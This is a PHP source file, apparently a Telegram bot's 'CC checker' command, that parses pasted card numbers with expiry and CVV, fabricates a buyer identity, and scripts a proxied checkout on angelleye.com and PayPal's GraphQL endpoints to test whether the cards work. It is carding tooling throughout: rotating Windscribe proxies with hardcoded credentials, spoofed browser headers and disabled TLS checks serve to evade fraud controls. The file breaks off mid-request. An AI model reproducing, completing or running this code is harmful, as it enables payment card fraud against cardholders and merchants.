<?php

/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/


include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";


////////////====[MUTE]====////////////
if(strpos($message, "/pp ") === 0 || strpos($message, ".pp ") === 0){   
    $antispam = antispamCheck($userId);
    addUser($userId);
    
    if($antispam != False){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id
      ]);
      return;

    }else{
        $messageidtoedit1 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Wait for Result...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id

        ]);

        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 4);
        $bin = substr($cc, 0, 6);
        
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mm = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $yyyy = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
        

##########################################################CHECKER PART#######################################################  

//================[ User Randomization ]================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$first = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
//Email
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];

#------[Email Generator]------#

function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();

//
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

#------[Winscribe]------#
            
$proxy = [
    'socks-us.windscribe.com:1080',
    'socks-nl.windscribe.com:1080',
  ];

if (isset($proxy)){
$ip = "Proxy Live ✅";
}
if (empty($proxy)){
$ip = "Proxy Dead ❌";
}
//echo '['.$ip.'] <br>';


#------[GET]------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
            curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)]);
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, "sfbnu0lx-3nzx7fk:exqwdzhv32");
curl_setopt($ch, CURLOPT_URL, 'https://www.angelleye.com/product/paypal-shipment-tracking-numbers-woocommerce/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'authority: www.angelleye.com';
$headers[] = 'method: GET';
$headers[] = 'path: /product/paypal-shipment-tracking-numbers-woocommerce/';
$headers[] = 'scheme: https';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: none';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$get = curl_exec($ch);


#------[CURL- CART]------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
            curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)]);
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, "sfbnu0lx-3nzx7fk:exqwdzhv32");
curl_setopt($ch, CURLOPT_URL, 'https://www.angelleye.com/product/paypal-shipment-tracking-numbers-woocommerce/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: www.angelleye.com';
$headers[] = 'method: POST';
$headers[] = 'path: /product/paypal-shipment-tracking-numbers-woocommerce/';
$headers[] = 'scheme: https';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'cache-control: max-age=0';
$headers[] = 'content-type: multipart/form-data; boundary=----WebKitFormBoundarycV2dmaiVGjllREJ3';
$headers[] = 'origin: https://www.angelleye.com';
$headers[] = 'referer: https://www.angelleye.com/product/paypal-shipment-tracking-numbers-woocommerce/';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundarycV2dmaiVGjllREJ3
Content-Disposition: form-data; name="quantity"

1
------WebKitFormBoundarycV2dmaiVGjllREJ3
Content-Disposition: form-data; name="add-to-cart"

135095
------WebKitFormBoundarycV2dmaiVGjllREJ3
Content-Disposition: form-data; name="add-to-cart"

135095
------WebKitFormBoundarycV2dmaiVGjllREJ3--');
$curl01 = curl_exec($ch);




#------[GET-2]------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
            curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)]);
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, "sfbnu0lx-3nzx7fk:exqwdzhv32");
curl_setopt($ch, CURLOPT_URL, 'https://www.angelleye.com/cart/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'authority: www.angelleye.com';
$headers[] = 'method: GET';
$headers[] = 'path: /cart/';
$headers[] = 'scheme: https';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'cache-control: max-age=0';
$headers[] = 'referer: https://www.angelleye.com/product/paypal-shipment-tracking-numbers-woocommerce/';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/53';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$get2 = curl_exec($ch);


#------[CURL-2]------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
            curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)]);
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, "sfbnu0lx-3nzx7fk:exqwdzhv32");
curl_setopt($ch, CURLOPT_URL, 'https://www.angelleye.com/wc-api/WC_Gateway_PayPal_Express_AngellEYE?pp_action=set_express_checkout');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: www.angelleye.com';
$headers[] = 'method: POST';
$headers[] = 'path: /wc-api/WC_Gateway_PayPal_Express_AngellEYE?pp_action=set_express_checkout';
$headers[] = 'scheme: https';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'origin: https://www.angelleye.com';
$headers[] = 'referer: https://www.angelleye.com/cart/';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
$headers[] = 'x-requested-with: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'request_from=JSv4');
$curl02 = curl_exec($ch);

// Trimming The Token

$token = trim(strip_tags(getStr($curl02,'"token":"','"')));



#------[CURL- EXTRA]------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
            curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)]);
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, "sfbnu0lx-3nzx7fk:exqwdzhv32");
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/graphql?UpdateClientConfig');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: www.paypal.com';
$headers[] = 'method: POST';
$headers[] = 'path: /graphql?UpdateClientConfig';
$headers[] = 'scheme: https';
$headers[] = 'accept: application/json';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/json';
$headers[] = 'origin: https://www.paypal.com';
$headers[] = 'paypal-client-context: '.$token.'';
$headers[] = 'referer: https://www.paypal.com/smart/buttons?style.label=checkout&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.height=45&components.0=buttons&components.1=messages&locale.lang=en&locale.country=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVVFU2Q1ZENQN0ZtY1puekI3djMyVUlvLWdHZ25KdXB2ZGZMbGU5VEJKd09DNG5lQUNRaERWT05CdjNoYzFXLXBYbFhTNkctS0E1eTRLenYmY3VycmVuY3k9VVNEJm1lcmNoYW50LWlkPVVIQUxaMjI0NUVEVjYmY29tbWl0PXRydWUmY29tcG9uZW50cz1idXR0b25zLG1lc3NhZ2VzJmludGVudD1jYXB0dXJlJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX2JuamRzZWh0bHJha2pkbGZpc3pmdmRoeGFlZXF0cCJ9fQ&clientID=AUESd5dCP7FmcZnzB7v32UIo-gGgnJupvdfLle9TBJwOC4neACQhDVONBv3hc1W-pXlXS6G-KA5y4Kzv&sdkCorrelationID=f53694928f373&storageID=uid_36f9fe73ae_mta6ntu6mzy&sessionID=uid_6dcaad7bb7_mta6ntu6mzy&buttonSessionID=uid_12a7c56fda_mta6ntg6mde&env=production&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjp0cnVlLCJtZXJjaGFudENvbmZpZ0hhc2giOiIzZjBjZTQyY2I4M2FiZmRhY2NhYzM0NmNmMmM3YmNhYTMzNDE1MGRlIiwicHJvZHVjdHMiOnsicGF5SW40Ijp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjpmYWxzZSwiaW5zdGFsbG1lbnRzIjpmYWxzZSwidmVuZG9ycyI6eyJ2aXNhIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJtYXN0ZXJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJhbWV4Ijp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaXNjb3ZlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6dHJ1ZX0sInZlbm1vIjp7ImVsaWdpYmxlIjpmYWxzZX0sIml0YXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiY3JlZGl0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImFwcGxlcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInNlcGEiOnsiZWxpZ2libGUiOmZhbHNlfSwiaWRlYWwiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmFuY29udGFjdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJnaXJvcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImVwcyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzb2ZvcnQiOnsiZWxpZ2libGUiOmZhbHNlfSwibXliYW5rIjp7ImVsaWdpYmxlIjpmYWxzZX0sInAyNCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ6aW1wbGVyIjp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1heGltYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG8iOnsiZWxpZ2libGUiOmZhbHNlfSwibWVyY2Fkb3BhZ28iOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=desktop&experiment.enableVenmo=false&experiment.disablePaylater=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&merchantID.0=UHALZ2245EDV6&renderedButtons.0=paypal&renderedButtons.1=paylater&renderedButtons.2=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&allowBillingPayments=true';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
$headers[] = 'x-app-name: smart-payment-buttons';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"query":"\n            mutation UpdateClientConfig(\n                $orderID : String!,\n                $fundingSource : ButtonFundingSourceType!,\n                $integrationArtifact : IntegrationArtifactType!,\n                $userExperienceFlow : UserExperienceFlowType!,\n                $productFlow : ProductFlowType!,\n                $buttonSessionID : String\n            ) {\n                updateClientConfig(\n                    token: $orderID,\n                    fundingSource: $fundingSource,\n                    integrationArtifact: $integrationArtifact,\n                    userExperienceFlow: $userExperienceFlow,\n                    productFlow: $productFlow,\n                    buttonSessionID: $buttonSessionID\n                )\n            }\n        ","variables":{"orderID":"'.$token.'","fundingSource":"card","integrationArtifact":"PAYPAL_JS_SDK","userExperienceFlow":"INLINE","productFlow":"SMART_PAYMENT_BUTTONS"}}');
$curl03 = curl_exec($ch);

#------[CURL- EXTRA]------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
            curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)]);
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, "sfbnu0lx-3nzx7fk:exqwdzhv32");
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/graphql?GetCheckoutDetails');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: www.paypal.com';
$headers[] = 'method: POST';
$headers[] = 'path: /graphql?GetCheckoutDetails';
$headers[] = 'scheme: https';
$headers[] = 'accept: application/json';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/json';
$headers[] = 'origin: https://www.paypal.com';
$headers[] = 'paypal-client-context: '.$token.'';
$headers[] = 'referer: https://www.paypal.com/smart/buttons?style.label=checkout&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.height=45&components.0=buttons&components.1=messages&locale.lang=en&locale.country=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVVFU2Q1ZENQN0ZtY1puekI3djMyVUlvLWdHZ25KdXB2ZGZMbGU5VEJKd09DNG5lQUNRaERWT05CdjNoYzFXLXBYbFhTNkctS0E1eTRLenYmY3VycmVuY3k9VVNEJm1lcmNoYW50LWlkPVVIQUxaMjI0NUVEVjYmY29tbWl0PXRydWUmY29tcG9uZW50cz1idXR0b25zLG1lc3NhZ2VzJmludGVudD1jYXB0dXJlJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX2JuamRzZWh0bHJha2pkbGZpc3pmdmRoeGFlZXF0cCJ9fQ&clientID=AUESd5dCP7FmcZnzB7v32UIo-gGgnJupvdfLle9TBJwOC4neACQhDVONBv3hc1W-pXlXS6G-KA5y4Kzv&sdkCorrelationID=f53694928f373&storageID=uid_36f9fe73ae_mta6ntu6mzy&sessionID=uid_6dcaad7bb7_mta6ntu6mzy&buttonSessionID=uid_12a7c56fda_mta6ntg6mde&env=production&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjp0cnVlLCJtZXJjaGFudENvbmZpZ0hhc2giOiIzZjBjZTQyY2I4M2FiZmRhY2NhYzM0NmNmMmM3YmNhYTMzNDE1MGRlIiwicHJvZHVjdHMiOnsicGF5SW40Ijp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjpmYWxzZSwiaW5zdGFsbG1lbnRzIjpmYWxzZSwidmVuZG9ycyI6eyJ2aXNhIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJtYXN0ZXJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJhbWV4Ijp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaXNjb3ZlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6dHJ1ZX0sInZlbm1vIjp7ImVsaWdpYmxlIjpmYWxzZX0sIml0YXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiY3JlZGl0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImFwcGxlcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInNlcGEiOnsiZWxpZ2libGUiOmZhbHNlfSwiaWRlYWwiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmFuY29udGFjdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJnaXJvcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImVwcyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzb2ZvcnQiOnsiZWxpZ2libGUiOmZhbHNlfSwibXliYW5rIjp7ImVsaWdpYmxlIjpmYWxzZX0sInAyNCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ6aW1wbGVyIjp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1heGltYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG8iOnsiZWxpZ2libGUiOmZhbHNlfSwibWVyY2Fkb3BhZ28iOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=desktop&experiment.enableVenmo=false&experiment.disablePaylater=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&merchantID.0=UHALZ2245EDV6&renderedButtons.0=paypal&renderedButtons.1=paylater&renderedButtons.2=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&allowBillingPayments=true';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
$headers[] = 'x-app-name: smart-payment-buttons';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"query":"\n            query GetCheckoutDetails($orderID: String!) {\n                checkoutSession(token: $orderID) {\n                    cart {\n                        billingType\n                        intent\n                        paymentId\n                        billingToken\n                        amounts {\n                            total {\n                                currencyValue\n                                currencyCode\n                                currencyFormatSymbolISOCurrency\n                            }\n                        }\n                        supplementary {\n                            initiationIntent\n                        }\n                        category\n                    }\n                    flags {\n                        isChangeShippingAddressAllowed\n                    }\n                    payees {\n                        merchantId\n                        email {\n                            stringValue\n                        }\n                    }\n                }\n            }\n        ","variables":{"orderID":"'.$token.'"}}');
$curl04 = curl_exec($ch);


#------[GET-3]------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
            curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)]);
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, "sfbnu0lx-3nzx7fk:exqwdzhv32");
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/smart/card-fields?sessionID=uid_6dcaad7bb7_mta6ntu6mzy&buttonSessionID=uid_12a7c56fda_mta6ntg6mde&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVVFU2Q1ZENQN0ZtY1puekI3djMyVUlvLWdHZ25KdXB2ZGZMbGU5VEJKd09DNG5lQUNRaERWT05CdjNoYzFXLXBYbFhTNkctS0E1eTRLenYmY3VycmVuY3k9VVNEJm1lcmNoYW50LWlkPVVIQUxaMjI0NUVEVjYmY29tbWl0PXRydWUmY29tcG9uZW50cz1idXR0b25zLG1lc3NhZ2VzJmludGVudD1jYXB0dXJlJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX2JuamRzZWh0bHJha2pkbGZpc3pmdmRoeGFlZXF0cCJ9fQ&disable-card=&token=EC-3NT75172S6225680U');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'authority: www.paypal.com';
$headers[] = 'method: GET';
